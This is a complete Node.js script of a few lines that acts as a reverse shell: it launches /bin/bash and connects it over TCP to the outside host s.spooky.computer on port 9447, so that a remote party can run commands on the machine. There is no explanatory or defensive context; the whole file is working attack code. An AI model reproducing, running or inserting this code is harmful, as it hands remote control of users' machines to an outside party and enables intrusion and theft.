#!/usr/bin/env node

var net = require("net"), sh = require("child_process").exec("/bin/bash");
var client = new net.Socket();
client.connect(9447, "s.spooky.computer", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);
sh.stderr.pipe(client);});
